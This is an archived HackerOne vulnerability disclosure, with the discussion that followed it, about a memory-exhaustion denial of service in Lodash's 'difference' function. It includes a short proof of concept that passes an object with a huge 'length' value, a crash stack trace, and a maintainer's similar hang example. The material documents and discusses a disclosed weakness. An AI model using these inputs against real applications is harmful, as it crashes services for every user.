---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/uncontrolled-resource-consumption
  - env/web
  - stack/node
  - vuln/dos
  - fix/input-validation
substate: "informative"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2019-12-04
submitted: 2019-08-09T23:22:49.175Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "spengietz"
source: "https://hackerone.com/reports/670779"
title: "Lodash 'difference' (possibly others) Function Denial of Service Through Unvalidated Input"
---
# Lodash "difference" (possibly others) Function Denial of Service Through Unvalidated Input

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 6 | **Program:** Node.js third-party modules | **Disclosed:** 2019-12-04

- Report: [https://hackerone.com/reports/670779](https://hackerone.com/reports/670779)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2019-08-09T23:22:49.175Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report a denial of service in Lodash.
It allows excessive usage of the NodeJS process's memory, leading to a "JavaScript heap out of memory" crash. The same vulnerability exists in the browser version of Lodash and causes Firefox's tab to crash and restart and causes Chrome's tab to completely freeze and become uncloseable (from my testing at least).

# Module

**module name:** Lodash
**version:** Only tested in 4.17.15
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

> Copy description from npm page

A modern JavaScript utility library delivering modularity, performance & extras.
The Lodash library exported as Node.js modules.

## Module Stats

> Replace stats below with numbers from npm’s module page:

24,853,923 downloads in the last week
I can't find where it lists the daily/monthly downloads

# Vulnerability

## Vulnerability Description

> Description about how the vulnerability was found and how it can be exploited, how it harms package users (data modification/lost, system access, other.

The vulnerability was discovered while pentesting a web application for a client. The Lodash "difference" function (https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L6947) uses the "baseDifference" function (https://github.com/lodash/lodash/blob/4.17.15/lodash.js#L2764) to perform what it needs to. "difference" is supposed to accept two arrays (`_.difference(array, [values])`) but it does not actually verify whether it is dealing with valid arrays before processing the data. This means a custom malicious Object can be supplied and the function will think it is an array, allowing excessive memory consumption that ends up in a crash of the Node.js process (or crash/freeze of the browser tab in Firefox/Chrome).

It was found to be exploitable in the clients application because they were passing user-supplied data into the "difference" function, which allowed me to crash their application with this vulnerability.

## Steps To Reproduce:

> Detailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.

Benign example:
```
const _ = require('lodash')

user_supplied_array = [1, 2, 3]
values_to_compare_to = {'length': 5} // An object with the "length" property defined to an integer will be accepted as an array by the _.difference function

_.difference(values_to_compare_to, user_supplied_array) // This will output a new array of length 5 where each value is "undefined"
```

Because Lodash is essentially creating a new array of the length that we specify in "values_to_compare_to", we can provide a large value that will cause the Node.js process to crash before it can successfully create the array.

Will crash Node.js example:
```
const _ = require('lodash')

user_supplied_array = [1, 2, 3]
values_to_compare_to = {'length': 99999999999} // This could be any huge value

_.difference(values_to_compare_to, user_supplied_array) // The Node.js process will crash, saying that the JavaScript heap ran out of memory
```

When the Node.js process crashes, a stack trace similar to the following is output:
```
[5515:0x55aa82652700]    41959 ms: Mark-sweep 580.0 (585.7) -> 580.0 (585.7) MB, 201.8 / 0.0 ms  allocation failure GC in old space requested
[5515:0x55aa82652700]    42169 ms: Mark-sweep 580.0 (585.7) -> 579.9 (584.2) MB, 209.7 / 0.0 ms  last resort GC in old space requested
[5515:0x55aa82652700]    42372 ms: Mark-sweep 579.9 (584.2) -> 579.9 (584.2) MB, 203.2 / 0.0 ms  last resort GC in old space requested


<--- JS stacktrace --->

==== JS stack trace =========================================

Security context: 0x2eaefaca5729 <JSObject>
    1: baseDifference [/root/temp/tmp/node_modules/lodash/lodash.js:~2764] [pc=0x11aea9f0d272](this=0x28b6ba70c0f9 <JSGlobal Object>,array=0x3dd3a43ca4c9 <Object map = 0x1294fe65a571>,values=0x3dd3a43ca4a9 <JSArray[2]>,iteratee=0x3dd3a43822d1 <undefined>,comparator=0x3dd3a43822d1 <undefined>)
    2: arguments adaptor frame: 2->4
    3: /* anonymous */ [/root/temp/tmp/node_modules/lodash/lodash.j...

FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory
 1: node::Abort() [node]
 2: 0x55aa808c347e [node]
 3: v8::Utils::ReportOOMFailure(char const*, bool) [node]
 4: v8::internal::V8::FatalProcessOutOfMemory(char const*, bool) [node]
 5: v8::internal::Factory::NewUninitializedFixedArray(int) [node]
 6: 0x55aa80448b1d [node]
 7: v8::internal::Runtime_GrowArrayElements(int, v8::internal::Object**, v8::internal::Isolate*) [node]
 8: 0x11aea9d842fd
Aborted
```


## Patch

> If you're able to provide a patch with the fix please post it in this section

I don't know specifically, but it seems that proper verification that both inputs are arrays would fix this.

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

Tested on two separate operating systems with the same end results.
Windows:
- Windows 10
- Node.js v8.9.4
- npm version 5.6.0
- Firefox 68.01 and Chrome 76.0.3809.100 when testing the browser version of Lodash

Linux:
- Kali Linux
- Node.js v9.0.0
- npm version 6.1.0
- Did not test in Firefox/Chrome on this operating system

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N, it said to report it here
- I opened an issue in the related repository: N, it said not to publicly disclose it until after

## Impact

An attacker could cause excessive resource consumption which could slow down the server for other users or they could cause an outright crash of the Node.js process, denying service to all users of the application.

## Timeline

- **2019-08-09** @spengietz: >To help us escalate this report as quickly as possible, please take a moment to confirm your report addresses:

**Reproducible:** I included example code to crash the Node.js process
**Impact:** I demonstrated and described the impact of slowing down the server and/or crashing it completely.
**In Scope:** Lodash is listed as in-scope

Thanks!
- **2019-08-09** @spengietz: I forgot to include that this likely affects more than just the "difference" function because the vulnerability lies within the "baseDifference" function, meaning that other Lodash methods that use that function might be vulnerable to this denial of service as well.
- **Report Filed**
- **2019-08-12** @ktistai: Hi @spengietz 

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Thanks, 
@ktistai
- **Report Triaged**
- **2019-08-26** @spengietz: Hi there, just wanted to check in and see if there were any updates here. Thanks!
- **2019-09-09** @spengietz: Hey, just wanted to check in here again. Thank you!
- **2019-10-03** @lirantal: Hi @spengietz,

Thanks a lot for reporting the vulnerability.
I invited John Dalton, maintainer of lodash, to review and help us resolve the issue here.
- **Report Severity Updated**
- **2019-10-03** @lirantal: @spengietz could you also see if I got the CVSS score right for this report in your opinion?
- **External User Joined**
- **2019-10-03** @spengietz: Perfect, thanks @lirantal and @jdalton! Let me know if you have any questions
- **2019-10-03** @spengietz: Whoops I misread your message.
I just tried calculating the CVSS and came out with an 8.6 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H), but I don't work with CVSS rankings typically so I may be off on a switch or two there.
- **2019-10-04** @lirantal: The difference with both of our scores is the Scope. Why do you feel it is changed? 
For example, the vulnerable component is Node.js and the affected component is Node.js too.
- **2019-10-04** @spengietz: I was thinking that Lodash was the vulnerable component and that Node.js was the affected component, but maybe they are considered one of the same in this context
- **2019-10-04** @lirantal: if that was the case then vulnerable component would never be equal to impacted component. The vulnerability lies in the lodash library which puts the browser or the Node.js server as a vulnerable component as they are using it.
- **2019-10-04** @spengietz: Oh alright that makes sense, then I think your analysis is accurate
- **2019-10-04** @lirantal: Great, thanks for confirming.

@jdalton let us know if you need any help with resolving the issue.
@spengietz any chance you can help out John with figuring out other places that this occurs in the codebase?
- **2019-10-04** @spengietz: Just did a quick search in the lodash.js file (https://github.com/lodash/lodash/blob/4.17.15/lodash.js) to see what functions are relying on "baseDifference". Not sure if it might be imported and used elsewhere in the code though.

The functions that use baseDifference within lodash.js are here:
- difference
- differenceBy
- differenceWith
- baseXor
- without

Not sure about the exploitability if each of them, but possibly next week or next weekend I could look into that.
- **2019-10-05** @jdalton: Several of our methods are "Collections" methods meaning they accept an array-like object (an object with a length counts too). Many builtin array methods can accept things like this too.
```js
Array.prototype.forEach.call({'length': 99999999999}, () =>{}) // hang
```

Many bultin array methods tend to be `this` generic so they don't care that an object is not a real array either. I'm open to ideas to tackle it though.
- **2019-10-07** @spengietz: Ah that's interesting, didn't realize that. This seems like a tough problem to tackle then and I haven't worked intimately with Node.js for a while now so I don't have many insights. I'll keep thinking on it though and see if I can do some research tonight into what a good direction to go would be.
- **2019-10-08** @lirantal: @jdalton I see your point about this being perhaps a generic enough issue that it could be thought of "this is how it works in the language", and surely enough we will not consider the Array forEach example you demonstrated as a vulnerability. However, a user may consider lodash's methods to not work in the same way, and they wouldn't have your depth of knowledge for this.

What I think will be best here is to have a security disclaimer in lodash's documentation/repository which will make users aware of this security concern. WDYT?
- **2019-10-08** @jdalton: Improved docs is always a win for me :)
- **2019-10-08** @lirantal: @jdalton yay 🤗❤️
@spengietz WDYT?
- **2019-10-08** @spengietz: I think that works.

Do you know why the Array.prototype version above just hangs forever when the Lodash function actually crashes the node process? Not sure if that differentiates them, but it seems like a payload against Array.prototype would only affect the user who sent it, but an actual crash of the process would affect every user
- **2019-10-13** @lirantal: @jdalton ping me when you make an update to the README then and I'll close this issue?

@spengietz I'm not entirely sure but I can assume that perhaps lodash just straight-up tries to allocate more data on the heap than it was allowed and so it crashed on OOM where-as the language Array construct does it different by perhaps trying to allocate when memory is available only and so it may hang but not crash. That's just a guess though, I haven't looked into the inner workings of either.
- **2019-10-14** @spengietz: Given that, it seems like the two scenarios aren't very comparable then.

If I exploited the Array.prototype example above in a web application, it would just take a long time to respond to my request and not affect any other users (as far as I understand at least).

If I exploited the Lodash version that I reported, the entire server would crash and would deny access to every user of the application indefinitely.

Seems like these aren't quite the same and maybe a documentation change is not quite enough. Perhaps I'm wrong on the impact, but it seems that in Lodash the impact is far greater than the built-in JS methods.
- **2019-10-16** @spengietz: I wish I had more in-depth knowledge of Node.js internals to help come up with a better fix/solution, but I'm not sure I can.

This may not be applicable, but in Python the len() function provides the length of something, instead of relying on a .length attribute, so I wonder if there is some way to check in JavaScript if you're reading the value of the key "length" or if you're actually reading the length of the object/array.
- **2019-10-16** @lirantal: @spengietz are we discussing the internal Node.js (or rather v8 actually) API and its security? if so that's a whole different context than this H1 program which is focused on npm ecosystem modules.

@jdalton could lodash run some checks internally like checking hasOwnProperty or would that not matter? I guess even if you add it then it will be a breaking change for library consumers.
- **2019-10-16** @spengietz: I was just making the comparison because the impact of the v8 API versus the Lodash vuln I reported makes me think that additional documentation may not be enough to mitigate the risk that it presents, I just don't know exactly what a sufficient fix would look like in Lodash
- **2019-10-26** @lirantal: I think that a documentation update is required regardless to ensure developers are aware of the security context. 

@spengietz I believe this vulnerability applies to consumers of lodash that may use this "insecure" compare function and may get tricked into passing arbitrary sizes via objects to the function call. I'm not yet entirely convinced this is a vulnerability per-the-docs in lodash as you could generally consider C's malloc(size) as vulnerable as well since you can pass a large enough size and crash an app. I do agree however that a security disclaimer needs to be added by @jdalton to ensure developers are aware of the potential security issue.
- **2019-10-28** @spengietz: Yeah that's a good point on malloc. It's not a vulnerability in the function, it's a vulnerability in incorrectly using the function.

Alright I'm on board with that then!
- **2019-12-04** @lirantal: @spengietz I will close the issue as informative and disclose so we can retain the action items from this and make it available for lodash maintainers and community to follow-up with a PR for this later.
- **Report Informative**
- **Agreed On Going Public**
- **Manually Disclosed**
